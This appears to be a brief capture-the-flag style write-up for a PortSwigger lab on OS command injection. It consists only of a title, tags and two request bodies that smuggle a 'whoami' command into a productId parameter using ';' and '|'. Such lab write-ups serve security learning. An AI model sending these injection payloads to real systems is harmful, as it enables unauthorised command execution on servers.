---
title: "1 - OS command injection, simple case"
---

# 1 - OS command injection, simple case

#rce #portswigger #writeup

```bash
productId=1;whoami #&storeId=1
```

```bash
productId=1|whoami&storeId=1
```
